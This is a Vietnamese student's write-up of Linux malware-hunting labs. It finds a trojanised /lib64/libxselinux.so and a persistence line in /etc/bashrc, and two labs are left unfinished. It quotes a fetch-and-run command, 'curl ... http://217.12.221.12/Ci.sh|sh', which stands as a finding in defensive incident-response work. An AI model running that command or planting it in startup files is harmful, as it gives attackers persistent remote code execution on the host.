# Lab21

## [1]. Các bước thực hiện

- Khi khởi động terminal của linux server thì thấy có thông báo lỗi liên quan đến `ld.so` khi cố gắng link đến thư viện `/lib64/libxselinux.so`.

![1.png](./Lab21/1.png)

- Check hash file `sha256sum /lib64/libxselinux.so` rồi kiểm tra trên `Virustotal` thì thấy có cảnh báo là malware.

![2.png](./Lab21/2.png)

- Mã độc giả mạo hoặc đã inject vào thư viện `libxselinux.so` của `SELinux` và được cấp đủ quyền để có thể thực thi hành vi độc hại của mình.

> Kết luận

- Thời gian mã độc xuất hiện: `20/01/2021 14:00:30`.
- Đường dẫn mã độc: `/lib64/libxselinux.so`.
- Cách thức mã độc persistence trên hệ thống: File thư viện `/lib64/libxselinux.so` được ld.so liên kết khi `SELinux` khởi động.

# Lab22

- Lab 22 em check hết theo dấu hiệu từ file check-list nhưng không hunt được malware nào.

## [1]. Các bước thực hiện

> Kết luận

- Thời gian mã độc xuất hiện: .
- Đường dẫn mã độc: .
- Cách thức mã độc persistence trên hệ thống: .

# Lab23

## [1]. Các bước thực hiện

- Khi khởi động terminal của linux server thì thấy có thông báo lỗi truy cập trang web nào đó `404 Not Found`.

![1.jpg](./Lab23/1.jpg)

- Kiểm tra theo danh sách lệnh rà soát các thành phần khởi động cùng hệ thống sau:

```bash
ls -latr /etc/cron*
ls -latr /home/*/.bashrc
ls -latr /home/*/.bash_profile
ls -latr /home/*/.bash_logout
ls -latr /etc/profile
ls -latr /etc/environment
ls -latr /etc/bashrc
ls -latr /etc/init.d/ | more
ls -latr /etc/rc*.d/ | more
ls -latr /etc/ssh/sshrc
ls -latr /etc/xdg/lxsession/Lubuntu/autostart
ls -latr /usr/share/autostart
ls -latr /etc/xdg/xfce4/xinitrc
```

- Sau khi kiểm tra sự tồn tại của các file trong lệnh trên thì đọc nội dung, khi đọc nội dung file `/etc/bashrc` thì thấy cuối file có lệnh `curl -s -L http://217.12.221.12/Ci.sh|sh`.

- Lệnh `curl -s -L http://217.12.221.12/Ci.sh|sh` được thêm vào `/etc/bashrc`, khi login thì lệnh sẽ được thực thi và download file `Ci.sh` từ host sau đó thực thi để thực hiện hành vi độc hại (Do Host chết nên không download file về được).

![1.png](./Lab23/1.png)

> Kết luận

- Thời gian mã độc xuất hiện: .
- Đường dẫn mã độc: .
- Cách thức mã độc persistence trên hệ thống: Sử dụng thành phần khởi động cùng hệ thống file `/etc/bashrc`.

# Lab24

- Lab 24 máy em lỗi không phục hồi được snapshot.

## [1]. Các bước thực hiện

> Kết luận

- Thời gian mã độc xuất hiện: .
- Đường dẫn mã độc: .
- Cách thức mã độc persistence trên hệ thống: .
